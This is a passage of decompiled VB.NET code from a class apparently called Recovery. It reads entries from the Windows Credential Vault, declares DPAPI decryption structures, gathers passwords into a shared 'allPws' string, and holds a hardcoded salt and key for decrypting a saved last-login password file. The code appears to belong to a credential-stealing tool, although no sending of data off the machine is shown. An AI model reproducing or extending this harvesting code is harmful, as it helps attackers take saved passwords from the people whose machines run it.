			Dim obj As Object = Marshal.PtrToStructure(vaultElementPtr, GetType(VaultCli.VAULT_ITEM_ELEMENT))
			Dim field As FieldInfo = obj.[GetType]().GetField("Type")
			Dim value As Object = field.GetValue(obj)
			Dim intPtr As IntPtr = CType((vaultElementPtr.ToInt64() + 16L), IntPtr)
			Select Case CInt(value)
				Case 0
					Dim obj2 As Object = Marshal.ReadByte(intPtr)
					Return CBool(obj2)
				Case 1
					Return Marshal.ReadInt16(intPtr)
				Case 2
					Return Marshal.ReadInt16(intPtr)
				Case 3
					Return Marshal.ReadInt32(intPtr)
				Case 4
					Return Marshal.ReadInt32(intPtr)
				Case 5
					Return Marshal.PtrToStructure(intPtr, GetType(Double))
				Case 6
					Return Marshal.PtrToStructure(intPtr, GetType(Guid))
				Case 7
					Dim intPtr2 As IntPtr = Marshal.ReadIntPtr(intPtr)
					Return Marshal.PtrToStringUni(intPtr2)
				Case 12
					Dim intPtr3 As IntPtr = Marshal.ReadIntPtr(intPtr)
					Dim securityIdentifier As SecurityIdentifier = New SecurityIdentifier(intPtr3)
					Return securityIdentifier.Value
			End Select
			Return Nothing
		End Function

		' Token: 0x0400013C RID: 316
		Public Shared allPws As String = String.Empty

		' Token: 0x0400013D RID: 317
		Private _drive As DriveInfo

		' Token: 0x0400013E RID: 318
		Private _accounts As List(Of Account) = New List(Of Account)()

		' Token: 0x0400013F RID: 319
		Private LastLoginSalt As Byte() = New Byte() { 12, 157, 74, 228, 30, 131, 21, 252 }

		' Token: 0x04000140 RID: 320
		Private Const LastLoginPassword As String = "passwordfile"

		' Token: 0x02000049 RID: 73
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure DATA_BLOB
			' Token: 0x04000141 RID: 321
			Public cbData As Integer

			' Token: 0x04000142 RID: 322
			Public pbData As IntPtr
		End Structure

		' Token: 0x0200004A RID: 74
		<StructLayout(LayoutKind.Sequential, CharSet := CharSet.Unicode)>
		Private Structure CRYPTPROTECT_PROMPTSTRUCT
			' Token: 0x04000143 RID: 323
			Public cbSize As Integer

			' Token: 0x04000144 RID: 324
			Public dwPromptFlags As Recovery.CryptProtectPromptFlags

			' Token: 0x04000145 RID: 325
			Public hwndApp As IntPtr

			' Token: 0x04000146 RID: 326
			Public szPrompt As String
		End Structure

		' Token: 0x0200004B RID: 75
		<Flags()>
		Private Enum CryptProtectPromptFlags
			' Token: 0x04000148 RID: 328
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
			' Token: 0x04000149 RID: 329
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		End Enum

		' Token: 0x0200004C RID: 76
		<Flags()>
		Private Enum CryptProtectFlags
			' Token: 0x0400014B RID: 331
			CRYPTPROTECT_UI_FORBIDDEN = 1
			' Token: 0x0400014C RID: 332
			CRYPTPROTECT_LOCAL_MACHINE = 4
			' Token: 0x0400014D RID: 333
			CRYPTPROTECT_CRED_SYNC = 8
			' Token: 0x0400014E RID: 334
			CRYPTPROTECT_AUDIT = 16
			' Token: 0x0400014F RID: 335
			CRYPTPROTECT_NO_RECOVERY = 32
			' Token: 0x04000150 RID: 336
			CRYPTPROTECT_VERIFY_PROTECTION = 64
		End Enum
	End Class
End Namespace
